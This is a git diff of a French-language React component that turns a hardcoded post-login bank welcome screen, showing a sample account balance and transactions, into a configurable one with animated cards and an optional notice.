@@ -1,7 +1,9 @@
 import QRCode from 'qrcode';
 import { useEffect, useRef, useState } from 'react';
-import type { ReactNode } from 'react';
+import type { CSSProperties, ReactNode } from 'react';
 import type { KeyEvent } from '../../shared/types';
+import { DEFAULT_WELCOME } from '../../shared/welcome';
+import type { WelcomeContent } from '../../shared/welcome';
 import { attachKeystrokeCapture } from '../capture/keystroke';
 import type { ClientMessage } from '../ws';
 
@@ -191,36 +193,63 @@ export function StepUp({
   );
 }
 
-const TRANSACTIONS = [
-  { label: 'Salaire — Octobre', amount: '+ 4 850,00', credit: true },
-  { label: 'Loyer', amount: '− 1 620,00', credit: false },
-  { label: 'Supermarché', amount: '− 86,40', credit: false },
-];
+const isCredit = (amount: string): boolean => amount.trim().startsWith('+');
 
-/** Accès accordé : animation de validation puis aperçu de l'espace client. */
-export function Welcome() {
+/** Accès accordé : validation animée puis aperçu de l'espace client (contenu réglable en configuration). */
+export function Welcome({ content = DEFAULT_WELCOME }: { content?: WelcomeContent }) {
+  const item = (i: number) => ({ '--i': i }) as CSSProperties;
   return (
     <div className="welcome" role="status" aria-label="verdict">
-      <svg className="success-check" viewBox="0 0 52 52" aria-hidden="true">
-        <circle cx="26" cy="26" r="24" />
-        <path d="M15 27 L23 35 L38 18" />
-      </svg>
-      <h2>Connexion réussie</h2>
-      <p className="login-sub">Bienvenue dans votre espace {BANK_NAME}.</p>
-      <div className="account-card">
-        <span className="account-label">Compte courant · •••• 4821</span>
-        <span className="account-balance">
-          12 480,35 <small>CHF</small>
-        </span>
-        <ul>
-          {TRANSACTIONS.map((t) => (
-            <li key={t.label}>
-              <span>{t.label}</span>
-              <span className={t.credit ? 'credit' : undefined}>{t.amount}</span>
-            </li>
-          ))}
-        </ul>
+      <div className="welcome-top">
+        <svg className="success-check" viewBox="0 0 52 52" aria-hidden="true">
+          <circle cx="26" cy="26" r="24" />
+          <path d="M15 27 L23 35 L38 18" />
+        </svg>
+        <div>
+          <h2>Connexion réussie</h2>
+          <p className="login-sub">
+            {content.name ? `Bonjour ${content.name}, bienvenue` : 'Bienvenue'} dans votre espace {BANK_NAME}.
+          </p>
+        </div>
       </div>
+
+      <div className="account-card" style={item(0)}>
+        <div className="account-main">
+          <span className="account-label">{content.accountLabel}</span>
+          <span className="account-balance">
+            {content.balance} <small>{content.currency}</small>
+          </span>
+        </div>
+        <svg className="spark" viewBox="0 0 120 44" aria-hidden="true">
+          <path d="M2 36 L20 30 L38 33 L56 20 L74 24 L92 10 L118 6" />
+        </svg>
+      </div>
+
+      {content.transactions.length > 0 && (
+        <div className="txn-card" style={item(1)}>
+          <h3>Dernières opérations</h3>
+          <ul>
+            {content.transactions.map((t, i) => (
+              <li key={`${t.label}-${i}`} style={item(i + 2)}>
+                <span className="txn-icon" aria-hidden="true">
+                  {t.icon || '•'}
+                </span>
+                <span className="txn-label">{t.label}</span>
+                <span className={isCredit(t.amount) ? 'txn-amount credit' : 'txn-amount'}>{t.amount}</span>
+              </li>
+            ))}
+          </ul>
+        </div>
+      )}
+
+      {content.notice && (
+        <div className="notice" style={item(content.transactions.length + 3)}>
+          <svg viewBox="0 0 20 20" aria-hidden="true">
+            <path d="M10 3a4.5 4.5 0 0 0-4.5 4.5c0 3-1.5 4-1.5 5h12c0-1-1.5-2-1.5-5A4.5 4.5 0 0 0 10 3zM8.3 15.5a1.8 1.8 0 0 0 3.4 0" />
+          </svg>
+          <p>{content.notice}</p>
+        </div>
+      )}
     </div>
   );
 }
